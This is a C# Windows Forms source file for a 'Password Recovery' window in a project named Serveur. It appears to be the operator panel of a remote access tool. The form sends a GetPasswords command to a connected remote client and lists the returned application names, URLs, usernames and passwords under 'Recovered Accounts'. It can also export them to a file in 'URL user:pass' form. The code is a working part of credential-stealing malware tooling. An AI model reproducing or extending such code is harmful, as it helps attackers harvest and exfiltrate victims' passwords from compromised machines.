using Serveur.Controllers.Server;
using Serveur.Models;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmPasswordRecovery : Form
    {
        private readonly ClientMosaic _client;
        private readonly object _addingLock = new object();
        private readonly RecoveredAccount _noResultsFound;

        public FrmPasswordRecovery(ClientMosaic client)
        {
            _client = client;
            InitializeComponent();
            client.value.frmPr = this;
            //txtFormat.Text = ListenerState.SaveFormat;

            _noResultsFound = new RecoveredAccount()
            {
                application = "No Results Found",
                URL = "N/A",
                username = "N/A",
                password = "N/A"
            };
        }

        private void FrmPasswordRecovery_Load(object sender, EventArgs e)
        {
            recoverPasswords();
        }

        public void recoverPasswords()
        {
            clearAllToolStripMenuItem_Click(null, null);

             new Packets.ServerPackets.GetPasswords().Execute(_client);
        }

        private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (_addingLock)
            {
                lvPasswords.Items.Clear();
                lvPasswords.Groups.Clear();

                updateRecoveryCount();
            }
        }

        private void updateRecoveryCount()
        {
            Invoke(new MethodInvoker(() => gbRecoveredAcc.Text = string.Format("Recovered Accounts [ {0} ]", lvPasswords.Items.Count)));
        }

        public void AddPasswords(RecoveredAccount[] accounts, string identification)
        {
            try
            {
                lock (_addingLock)
                {
                    var items = new List<ListViewItem>();

                    foreach (var acc in accounts)
                    {
                        var lvi = new ListViewItem { Tag = acc, Text = identification };

                        lvi.SubItems.Add(acc.URL); // URL
                        lvi.SubItems.Add(acc.username); // User
                        lvi.SubItems.Add(acc.password); // Pass

                        var lvg = GetGroupFromApplication(acc.application);

                        if (lvg == null) //Create new group
                        {
                            lvg = new ListViewGroup { Name = acc.application.Replace(" ", string.Empty), Header = acc.application };
                            Invoke(new MethodInvoker(() => lvPasswords.Groups.Add(lvg))); //Add the new group
                        }

                        lvi.Group = lvg;
                        items.Add(lvi);
                    }

                    Invoke(new MethodInvoker(() => { lvPasswords.Items.AddRange(items.ToArray()); }));
                    UpdateRecoveryCount();
                }

                if (accounts.Length == 0) //No accounts found
                {
                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = identification };

                    lvi.SubItems.Add(_noResultsFound.URL); // URL
                    lvi.SubItems.Add(_noResultsFound.username); // User
                    lvi.SubItems.Add(_noResultsFound.password); // Pass

                    var lvg = GetGroupFromApplication(_noResultsFound.application);

                    if (lvg == null) //Create new group
                    {
                        lvg = new ListViewGroup { Name = _noResultsFound.application, Header = _noResultsFound.application };
                        Invoke(new MethodInvoker(() => lvPasswords.Groups.Add(lvg))); //Add the new group
                    }

                    lvi.Group = lvg;
                    Invoke(new MethodInvoker(() => { lvPasswords.Items.Add(lvi); }));
                }
            }
            catch
            {
            }
        }

        private ListViewGroup GetGroupFromApplication(string app)
        {
            ListViewGroup lvg = null;
            Invoke(new MethodInvoker(delegate
            {
                foreach (var @group in lvPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
                {
                    lvg = @group;
                }
            }));
            return lvg;
        }

        private void UpdateRecoveryCount()
        {
            Invoke(new MethodInvoker(() => gbRecoveredAcc.Text = string.Format("Recovered Accounts [ {0} ]", lvPasswords.Items.Count)));
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();

            if (selected)
            {
                foreach (ListViewItem lvi in lvPasswords.SelectedItems)
                {
                    sb.Append(lvi.SubItems[0].Text + ' ' + lvi.SubItems[1].Text + ' ' +  lvi.SubItems[2].Text + ':' + lvi.SubItems[3].Text + "\n");
                }
            }
            else
            {
                foreach (ListViewItem lvi in lvPasswords.Items)
                {
                    sb.Append(lvi.SubItems[0].Text + ' ' + lvi.SubItems[1].Text + ' ' + lvi.SubItems[2].Text + ':' + lvi.SubItems[3].Text + "\n");
                }
            }

            return sb;
        }

        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }
    }
}
